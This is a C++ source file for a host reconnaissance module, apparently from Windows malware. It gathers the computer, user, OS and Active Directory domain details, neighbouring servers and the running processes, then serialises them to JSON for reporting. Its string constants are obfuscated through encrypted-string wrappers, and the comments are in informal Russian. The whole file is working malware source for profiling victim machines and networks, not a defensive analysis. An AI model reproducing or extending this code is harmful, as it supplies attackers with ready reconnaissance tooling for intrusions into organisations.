#include "information.hpp"
#include "registry.hpp"
#include "strings.hpp"
#include <ntsecapi.h>
#include "ntos.h"

DefaultInformationGather::DefaultInformationGather()
{
#ifdef _DEBUG
	WriteLog(L"[DefaultInformationGather] constructor");
#endif
	this->ctx = nullptr;
}

DefaultInformationGather::~DefaultInformationGather()
{
#ifdef _DEBUG
	WriteLog(L"[DefaultInformationGather] destructor");
#endif
	if (this->ctx != nullptr)
		this->free_ctx();

}

BOOL DefaultInformationGather::collect()
{
#ifdef _DEBUG
	WriteLog(L"[DefaultInformationGather] collecting information... ");
#endif

	if (this->ctx != nullptr)
		this->free_ctx();

	BOOL bRet = FALSE;

	do
	{
		this->ctx = new DefaultInformationGather::informationdata;
		if (this->ctx == nullptr)
			break;

		RtlSecureZeroMemory(this->ctx, sizeof(DefaultInformationGather::informationdata));

		bRet |= this->FillComputerName();
		bRet |= this->FillOsName();
		bRet |= this->FillUserName();
		bRet |= this->FillDomainInfoBasic();
		bRet |= this->FillServerList();
		bRet |= this->FillSystemProcessInformation();

	} while (FALSE);

	return bRet;
}

BOOL DefaultInformationGather::create_json(blob * pbJsonOutput)
{
#ifdef _DEBUG
	WriteLog(L"[DefaultInformationGather] creating json");
#endif

	BOOL bRet = FALSE;

	CCryptString cStr_network(cryptedstr_network);
	CCryptString cStr_domaininfo(cryptedstr_domaininfo);
	CCryptString cStr_compname(cryptedstr_compname);
	CCryptString cStr_username(cryptedstr_username);
	CCryptString cStr_osname(cryptedstr_osname);
	CCryptString cStr_plist(cryptedstr_plist);

	JsonBuilder domainbuilder;
	JsonBuilder masterbuilder;

	// освободится с деструкторе domainbuilder
	PWCHAR pwDomainJson = this->domain_json(&domainbuilder);
	// а это надо самим освобождать
	PWCHAR pwServerJson = this->server_arrayjson();
	PWCHAR pwchProcessJson = this->process_arraysjson();

	UINT iRequiredLength = 0;
	SIZE_T dwLenResult = 0;
	do
	{
		if (pwDomainJson != nullptr)
			iRequiredLength += wcsnlen_s(pwDomainJson, 10240) + 6;

		if (pwServerJson != nullptr)
			iRequiredLength += wcsnlen_s(pwServerJson, 10240) + 6;

		if (pwchProcessJson != nullptr)
			iRequiredLength += wcsnlen_s(pwchProcessJson, 10240) + 6;

		iRequiredLength += this->ctx->bComputerName.dwBufSize + 6;
		iRequiredLength += this->ctx->bOSName.dwBufSize + 6;
		iRequiredLength += this->ctx->bUserName.dwBufSize + 6;

		iRequiredLength += wcsnlen_s(cStr_compname.w_str(), 1024) + 6;
		iRequiredLength += wcsnlen_s(cStr_domaininfo.w_str(), 1024) + 6;
		iRequiredLength += wcsnlen_s(cStr_network.w_str(), 1024) + 6;
		iRequiredLength += wcsnlen_s(cStr_username.w_str(), 1024) + 6;
		iRequiredLength += wcsnlen_s(cStr_osname.w_str(), 1024) + 6;
		iRequiredLength += wcsnlen_s(cStr_plist.w_str(), 1024) + 6;

		iRequiredLength += 64;

		if (!masterbuilder.init(iRequiredLength))
			break;

		if (this->ctx->bComputerName.lpBuffer != nullptr)
			masterbuilder.add(cStr_compname.w_str(), (PWCHAR)this->ctx->bComputerName.lpBuffer);

		if (this->ctx->bOSName.lpBuffer != nullptr)
			masterbuilder.add(cStr_osname.w_str(), (PWCHAR)this->ctx->bOSName.lpBuffer);

		if (this->ctx->bUserName.lpBuffer != nullptr)
			masterbuilder.add(cStr_username.w_str(), (PWCHAR)this->ctx->bUserName.lpBuffer);

		if (pwDomainJson != nullptr)
			masterbuilder.add_subsidiary_json(cStr_domaininfo.w_str(), pwDomainJson);

		if (pwServerJson != nullptr)
			masterbuilder.add_subsidiary_json(cStr_network.w_str(), pwServerJson);

		if (pwchProcessJson != nullptr)
			masterbuilder.add_subsidiary_json(cStr_plist.w_str(), pwchProcessJson);

		PWCHAR pwchJsonResult = masterbuilder.finish();
		if (pwchJsonResult == nullptr)
			break;

		dwLenResult = wcslen(pwchJsonResult) + 1;
		pbJsonOutput->lpBuffer = (LPBYTE)new WCHAR[dwLenResult + 1];
		if (pbJsonOutput->lpBuffer == nullptr)
			break;

		wcscpy((PWCHAR)pbJsonOutput->lpBuffer, pwchJsonResult);
		pbJsonOutput->dwBufSize = dwLenResult * 2;

		bRet = TRUE;

	} while (FALSE);

	if (pwServerJson != nullptr)
		delete[]pwServerJson;
	
	if (pwchProcessJson != nullptr)
		delete[]pwchProcessJson;

	return bRet;
}

BOOL DefaultInformationGather::free_ctx()
{
	if (this->ctx == nullptr)
		return FALSE;

#ifdef _DEBUG
	WriteLog(L"[DefaultInformationGather] freeing context structure");
#endif

	if (this->ctx->bComputerName.lpBuffer != nullptr)
		delete[]this->ctx->bComputerName.lpBuffer;
	
	if (this->ctx->bOSName.lpBuffer != nullptr)
		delete[]this->ctx->bOSName.lpBuffer;

	if (this->ctx->bUserName.lpBuffer != nullptr)
		delete[]this->ctx->bUserName.lpBuffer;

	if (this->ctx->pdsinfo != nullptr)
		DsRoleFreeMemory(this->ctx->pdsinfo);

	if (this->ctx->pProcessInformation != nullptr)
		delete[]this->ctx->pProcessInformation;

	for (UINT iIndex = 0; iIndex < MAX_NETSERVERENUM_ITERATIONS; iIndex++)
	{
		if (this->ctx->serversinfo.sinfo100[iIndex] == nullptr)
			break;

		NetApiBufferFree(this->ctx->serversinfo.sinfo100[iIndex]);

		this->ctx->serversinfo.sinfo100[iIndex] = nullptr;
		this->ctx->serversinfo.dwEntries[iIndex] = 0;
	}

	delete this->ctx;
	this->ctx = nullptr;

	return TRUE;
}

BOOL DefaultInformationGather::FillComputerName()
{
	if ((this->ctx == nullptr) || (this->ctx->bComputerName.lpBuffer != nullptr))
		return FALSE;

	BOOL bRet = FALSE;
	DWORD dwSize = 0;
	WCHAR wchTmp[1];
	do
	{
		// ожидаем, что функция провалится и вернем такую ошибку, если этого не произошло, то считаем что произошла действительная ошибка
		// из разряда - error function successfull
		if ((GetComputerNameW(wchTmp, &dwSize)) || (GetLastError() != ERROR_BUFFER_OVERFLOW))
			break;

		this->ctx->bComputerName.dwBufSize = dwSize;
		this->ctx->bComputerName.lpBuffer = (LPBYTE)new WCHAR[dwSize + 1];

		if (this->ctx->bComputerName.lpBuffer == nullptr)
			break;

		if (!GetComputerNameW((PWCHAR)this->ctx->bComputerName.lpBuffer, &dwSize))
			break;

#ifdef _DEBUG
		WriteLog(L"[DefaultInformationGather::FillComputerName] computer name: ", (PWCHAR)this->ctx->bComputerName.lpBuffer);
#endif

		bRet = TRUE;

	} while (FALSE);

	return bRet;
}

BOOL DefaultInformationGather::FillUserName()
{
	if ((this->ctx == nullptr) || (this->ctx->bUserName.lpBuffer != nullptr))
		return FALSE;

	BOOL bRet = FALSE;
	DWORD dwSize = 0;
	WCHAR wchTmp[1];
	do
	{
		// см FillComputerName, в отличие от имени компа с ошибкой buffer overflow, имя юзера при получении выбивает insufficient buffer, говноделы мс заебали
		if ((GetUserNameW(wchTmp, &dwSize)) || (GetLastError() != ERROR_INSUFFICIENT_BUFFER))
			break;

		this->ctx->bUserName.dwBufSize = dwSize;
		this->ctx->bUserName.lpBuffer = (LPBYTE)new WCHAR[dwSize + 1];
		
		if (this->ctx->bUserName.lpBuffer == nullptr)
			break;

		if (!GetUserNameW((PWCHAR)this->ctx->bUserName.lpBuffer, &dwSize))
			break;

#ifdef _DEBUG
		WriteLog(L"[DefaultInformationGather::FillUserName] user name: ", (PWCHAR)this->ctx->bUserName.lpBuffer);
#endif

		bRet = TRUE;

	} while (FALSE);

	return bRet;
}

BOOL DefaultInformationGather::FillOsName()
{
	if ((this->ctx == nullptr) || (this->ctx->bOSName.lpBuffer != nullptr))
		return FALSE;

	CCryptString cStr_productname(cryptedstr_productname);
	CCryptString cStr_currentversion(cryptedstr_currentverpath);

	BOOL bRet = registry_api::read_registry_key(HKEY_LOCAL_MACHINE, cStr_currentversion.w_str(), cStr_productname.w_str(), &this->ctx->bOSName, KEY_WOW64_64KEY);

#ifdef _DEBUG
	if (bRet)
		WriteLog(L"[DefaultInformationGather::FillOsName] operating system name: ", (PWCHAR)this->ctx->bOSName.lpBuffer);
#endif

	return bRet;
}

BOOL DefaultInformationGather::FillDomainInfoBasic()
{
	if ((this->ctx == nullptr) || (this->ctx->pdsinfo != nullptr))
		return FALSE;

	BOOL bRet = FALSE;
	do
	{
		if (DsRoleGetPrimaryDomainInformation(NULL, DSROLE_PRIMARY_DOMAIN_INFO_LEVEL::DsRolePrimaryDomainInfoBasic, (PBYTE*)&this->ctx->pdsinfo) != ERROR_SUCCESS)
		{
#ifdef _DEBUG
			WriteLog(L"[DefaultInformationGather::FillDomainInfoBasic] error DsRoleGetPrimaryDomainInformation");
#endif
			break;
		}

		bRet = TRUE;

#ifdef _DEBUG
		WCHAR textOutput[1024];
		wsprintfW(textOutput, L"[DefaultInformatioNGather::FillDomainInfoBasic] domain info, domain forest: %s, domain guid: %s, domain name dns: %s, name flat: %s, flags 0x%x, role 0x%x ",
			this->ctx->pdsinfo->DomainForestName, this->ctx->pdsinfo->DomainGuid,
			this->ctx->pdsinfo->DomainNameDns, this->ctx->pdsinfo->DomainNameFlat,
			this->ctx->pdsinfo->Flags, this->ctx->pdsinfo->MachineRole);
		WriteLog(textOutput);
#endif

	} while (FALSE);

	return bRet;
}

BOOL DefaultInformationGather::FillServerList()
{
	BOOL bRet = FALSE;

	DWORD dwLevel = LEVEL_SERVER;
	NET_API_STATUS nStatus = NULL;
	INT iIndex = 0;
	DWORD dwTotalEntries = 0;
	DWORD dwResumeHandle = 0;

#ifdef _DEBUG
	WCHAR textOutput[1024];
#endif

	do
	{
		this->ctx->serversinfo.sinfo100[iIndex] = nullptr;
		this->ctx->serversinfo.dwEntries[iIndex] = 0;
		nStatus = NetServerEnum(NULL, dwLevel, (LPBYTE*)&this->ctx->serversinfo.sinfo100[iIndex], MAX_PREFERRED_LENGTH, &this->ctx->serversinfo.dwEntries[iIndex], &dwTotalEntries, SV_TYPE_ALL, NULL, &dwResumeHandle);

#ifdef _DEBUG
		wsprintfW(textOutput, L"[DefaultInformationGather::FillServerList] server enum found %d servers [iter %d]", this->ctx->serversinfo.dwEntries[iIndex], iIndex);
		WriteLog(textOutput);
#endif

		iIndex++;

	} while (nStatus == ERROR_MORE_DATA);

	return ((nStatus == NERR_Success) || (iIndex > 1));
}

BOOL DefaultInformationGather::FillSystemProcessInformation()
{
	if ((this->ctx == nullptr) || (this->ctx->pProcessInformation != nullptr))
		return FALSE;

	this->ctx->pProcessInformation = (LPBYTE)SfuGetSystemInfo(SystemProcessInformation);

#ifdef _DEBUG
	if (this->ctx->pProcessInformation == nullptr)
		WriteLog(L"[DefaultInformationGather::FillSystemProcessInformation] error cant get process list");
#endif

	return (this->ctx->pProcessInformation != nullptr);
}

PWCHAR DefaultInformationGather::domain_json(JsonBuilder *jbuilder)
{
	if ((this->ctx == nullptr) || (this->ctx->pdsinfo == nullptr) || (jbuilder == nullptr))
		return nullptr;

	CCryptString cStr_forestname(cryptedstr_forestname);
	CCryptString cStr_namedns(cryptedstr_namedns);
	CCryptString cStr_nameflat(cryptedstr_nameflat);
	CCryptString cStr_flags(cryptedstr_flags);
	CCryptString cStr_machinerole(cryptedstr_machinerole);

#ifdef _DEBUG
	WriteLog(L"[DefaultInformationGather::domain_json] creating domain json...");
#endif

	UINT iRequiredLength = 0;
	PWCHAR pwchResult = nullptr;
	do
	{
		if (this->ctx->pdsinfo->DomainForestName != nullptr)
			iRequiredLength += wcsnlen_s(this->ctx->pdsinfo->DomainForestName, 1024);

		if (this->ctx->pdsinfo->DomainNameDns != nullptr)
			iRequiredLength += wcsnlen_s(this->ctx->pdsinfo->DomainNameDns, 1024);
		
		if (this->ctx->pdsinfo->DomainNameFlat != nullptr)
			iRequiredLength += wcsnlen_s(this->ctx->pdsinfo->DomainNameFlat, 1024);

		iRequiredLength += wcsnlen_s(cStr_flags.w_str(), 1024);
		iRequiredLength += wcsnlen_s(cStr_machinerole.w_str(), 1024);
		iRequiredLength += wcsnlen_s(cStr_forestname.w_str(), 1024);
		iRequiredLength += wcsnlen_s(cStr_namedns.w_str(), 1024);
		iRequiredLength += wcsnlen_s(cStr_nameflat.w_str(), 1024);

		// на флаги и всякие там кавычки + на всякий случай
		iRequiredLength += 1024;

		if (!jbuilder->init(iRequiredLength))
			break;

		jbuilder->add(cStr_machinerole.w_str(), this->ctx->pdsinfo->MachineRole);
		jbuilder->add(cStr_flags.w_str(), this->ctx->pdsinfo->Flags);

		if (this->ctx->pdsinfo->DomainForestName != nullptr)
			jbuilder->add(cStr_forestname.w_str(), this->ctx->pdsinfo->DomainForestName);

		if (this->ctx->pdsinfo->DomainNameDns != nullptr)
			jbuilder->add(cStr_namedns.w_str(), this->ctx->pdsinfo->DomainNameDns);

		if (this->ctx->pdsinfo->DomainNameFlat != nullptr)
			jbuilder->add(cStr_nameflat.w_str(), this->ctx->pdsinfo->DomainNameFlat);

		pwchResult = jbuilder->finish();

	} while (FALSE);

	return pwchResult;
}

PWCHAR DefaultInformationGather::server_arrayjson()
{
	if (this->ctx == nullptr)
		return nullptr;

	UINT iRequiredLength = 0;
	PWCHAR pwchResult = nullptr;
	
	DWORD dwTotalBuffers = 0;
	DWORD dwTotalServersName = 0;
	DWORD dwRequiredLength = 0;
	PSERVER_INFO_100 pinfo = nullptr;
	do
	{
		this->getserver_amount(&dwTotalBuffers, &dwTotalServersName);

		dwRequiredLength += 64; // дефолт размер строки
		dwRequiredLength += dwTotalServersName;

		pwchResult = new WCHAR[dwRequiredLength + 1];
		wcscpy(pwchResult, L"[");
		
		for (UINT iIndex = 0; iIndex < dwTotalBuffers; iIndex++)
		{
			if (this->ctx->serversinfo.sinfo100[iIndex] == nullptr)
				break;

			for (UINT iServerIndex = 0; iServerIndex < this->ctx->serversinfo.dwEntries[iIndex]; iServerIndex++)
			{
				wcscat(pwchResult, L"\"");
				wcscat(pwchResult, this->ctx->serversinfo.sinfo100[iIndex][iServerIndex].sv100_name);
				wcscat(pwchResult, L"\",");
			}
		}

		if (dwTotalServersName > 0)
			pwchResult[wcslen(pwchResult) - 1] = L'\0';

		wcscat(pwchResult, L"]");


	} while (FALSE);

	return pwchResult;
}

PWCHAR DefaultInformationGather::process_arraysjson()
{
	if ((this->ctx == nullptr) || (this->ctx->pProcessInformation == nullptr))
		return nullptr;

	PWCHAR pwchResult = nullptr;
	DWORD dwRequiredSize = 0;
	do
	{
		this->getprocess_amount(&dwRequiredSize);
		dwRequiredSize += 32;

		pwchResult = new WCHAR[dwRequiredSize + 1];
		if (pwchResult == nullptr)
			break;

		wcscpy(pwchResult, L"[");

		PSYSTEM_PROCESSES_INFORMATION pList = (PSYSTEM_PROCESSES_INFORMATION)this->ctx->pProcessInformation;
		PWCHAR pwchProcessName = nullptr;
		UINT uLengthProcessName = 0;
		for (;;)
		{
			
			if (!this->isProcessBlacklist((LPBYTE)&pList->ImageName))
			{
				wcscat(pwchResult, L"\"");

				pwchProcessName = pList->ImageName.Buffer;
				uLengthProcessName = pList->ImageName.Length / 2;
				wcsncat((wchar_t*)pwchResult, (const wchar_t*)pwchProcessName, (size_t)uLengthProcessName);

				wcscat(pwchResult, L"\",");
			}

			if (pList->NextEntryDelta == 0)
				break;

			pList = (PSYSTEM_PROCESSES_INFORMATION)((SIZE_T)pList + (SIZE_T)pList->NextEntryDelta);
		}

		pwchResult[wcslen(pwchResult) - 1] = L'\0';
		wcscat(pwchResult, L"]");

	} while (FALSE);

	return pwchResult;
}

VOID DefaultInformationGather::getserver_amount(PDWORD dwTotalBuffers, PDWORD dwServersNameLength)
{
	PSERVER_INFO_100 pinfo = nullptr;

	DWORD dwBufAmountResult = 0;
	DWORD dwServerLengthResult = 0;

	for (UINT iIndex = 0; iIndex < MAX_NETSERVERENUM_ITERATIONS; iIndex++)
	{
		if (this->ctx->serversinfo.sinfo100[iIndex] == nullptr)
			break;

		for (UINT iServerIndex = 0; iServerIndex < this->ctx->serversinfo.dwEntries[iIndex]; iServerIndex++)
		{
			pinfo = &this->ctx->serversinfo.sinfo100[iIndex][iServerIndex];
			dwServerLengthResult += wcsnlen_s(pinfo->sv100_name, 1024) + 12; // +12 на кавычки, пробелы и прочие прелести + на всякий случай
		}

		dwBufAmountResult += 1;
	}

	*dwTotalBuffers = dwBufAmountResult;
	*dwServersNameLength = dwServerLengthResult;

	return;
}

VOID DefaultInformationGather::getprocess_amount(PDWORD dwProcessAmountLength)
{
	if ((this->ctx == nullptr) || (this->ctx->pProcessInformation == nullptr))
		return;

	DWORD dwSizeResult = 0;
	PSYSTEM_PROCESSES_INFORMATION pList = (PSYSTEM_PROCESSES_INFORMATION)this->ctx->pProcessInformation;
	for (;;)
	{
		dwSizeResult += wcsnlen_s(pList->ImageName.Buffer, pList->ImageName.Length / 2) + 12; // +12 на кавычки, пробелы и прочие прелести + на всякий случай

		if (pList->NextEntryDelta == 0)
			break;

		pList = (PSYSTEM_PROCESSES_INFORMATION)((SIZE_T)pList + (SIZE_T)pList->NextEntryDelta);
	}

	*dwProcessAmountLength = dwSizeResult;
	return;
}

BOOL DefaultInformationGather::isProcessBlacklist(LPBYTE pStr)
{
	PUNICODE_STRING pustr = (PUNICODE_STRING)pStr;

	if ((pustr == nullptr) || (pustr->Length == 0) || (pustr->Buffer[0] == L'\0'))
		return TRUE;

	CCryptString lsass(cryptedstr_lsassexe);
	CCryptString svchost(cryptedstr_svchostexe);
	CCryptString conhost(cryptedstr_conhostexe);
	CCryptString csrss(cryptedstr_csrssexe);

	CONST INT iBlacklisted = 4;
	PWCHAR pwchBlacklist[iBlacklisted];
	pwchBlacklist[0] = lsass.w_str();
	pwchBlacklist[1] = svchost.w_str();
	pwchBlacklist[2] = conhost.w_str();
	pwchBlacklist[3] = csrss.w_str();

	for (UINT iIndex = 0; iIndex < sizeof(pwchBlacklist) / sizeof(PWCHAR); iIndex++)
	{
		if (!_wcsnicmp(pustr->Buffer, pwchBlacklist[iIndex], pustr->Length))
			return TRUE;
	}

	return FALSE;
}
